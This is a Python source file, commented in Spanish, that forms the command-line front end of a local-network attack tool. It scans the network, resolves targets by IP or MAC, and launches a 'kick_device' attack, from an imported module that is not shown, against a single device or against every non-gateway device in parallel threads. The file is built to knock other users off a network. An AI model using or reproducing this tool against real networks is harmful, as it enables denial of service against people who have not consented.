#!/usr/bin/env python3
# main.py
import os
import sys
import time
import threading

from network_utils import (
    get_gateway_ip, 
    scan_network, 
    es_ip, 
    es_mac, 
    get_ip_from_mac
)

from attack_modules import kick_device

from cli_interface import (
    get_arguments, 
    display_devices, 
    display_targets
)

from ascii_art import logo_01





def handle_list_devices():
    """ Maneja la opción de listar dispositivos """
    print("[*] Iniciando escaneo de red...")
    devices = scan_network()
    display_devices(devices)


def handle_kick_all(gateway):
    """ Maneja el ataque masivo a todos los dispositivos """
    print("[*] Iniciando escaneo para ataque masivo...")
    devices = scan_network()

    # Filtrar el gateway para no atacarlo
    targets = [d for d in devices if d["ip"] != gateway]

    if not targets:
        print("[-] No se encontraron dispositivos para atacar.")
        return

    display_targets(targets)
    print(f"\n[+] Iniciando ataque masivo contra {len(targets)} dispositivos...")
    print(f"[*] Presiona Ctrl+C para detener todos los ataques")

    # Atacar todos los dispositivos en paralelo
    attack_threads = []
    for device in targets:
        print(f"[*] Iniciando ataque contra {device['ip']}...")
        thread = threading.Thread(target=kick_device, args=(device["ip"],))
        thread.daemon = True
        attack_threads.append(thread)
        thread.start()
        time.sleep(1)  # Pequeño delay entre inicio de ataques

    # Esperar a que terminen todos los ataques (o KeyboardInterrupt)
    try:
        for thread in attack_threads:
            thread.join()
    except KeyboardInterrupt:
        print("\n[!] Deteniendo todos los ataques...")
        # Los threads daemon se detendrán automáticamente
        time.sleep(2)  # Dar tiempo para limpieza
    print("[+] Todos los ataques han terminado")


def handle_kick_specific(target, gateway):
    """ Maneja el ataque a un dispositivo específico """
    target_ip = None

    if es_ip(target):
        # El objetivo es una IP
        target_ip = target
    elif es_mac(target):
        # El objetivo es una MAC, buscar su IP
        print("[*] Buscando IP asociada a la MAC...")
        devices = scan_network()
        target_ip = get_ip_from_mac(target, devices)
        if not target_ip:
            print(f"[!] No se encontró una IP asociada a la MAC {target}")
            return
    else:
        print("[-] Formato de objetivo inválido.")
        print("[*] Usa una IP válida (ej: 192.168.1.100) o MAC (ej: aa:bb:cc:dd:ee:ff)")
        return

    if target_ip == gateway:
        print("[!] No se puede atacar el gateway de la red")
        return

    print(f"[+] Objetivo confirmado: {target_ip}")
    print(f"[+] Iniciando ataque contra {target_ip}")

    try:
        kick_device(target_ip)
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido por el usuario")
        print("[+] Operación terminada")



def main():
    """ Función principal del programa """
    # Verificar que estamos en Linux
    if os.name != 'posix':
        print("[!] Este script está optimizado para Linux")
        sys.exit(1)

    # Obtener argumentos
    args = get_arguments()
    
    # Verificar conectividad de red
    gateway = get_gateway_ip()
    if not gateway:
        print("[!] No se pudo obtener el gateway de la red")
        print("[!] Verifica tu conexión de red y permisos")
        sys.exit(1)

    print(logo_01("1.0.0"))

    # Procesar argumentos
    if args.list:
        handle_list_devices()
    elif args.target:
        if args.target.lower() == "all":
            handle_kick_all(gateway)
        else:
            handle_kick_specific(args.target, gateway)





if __name__ == "__main__":
    main()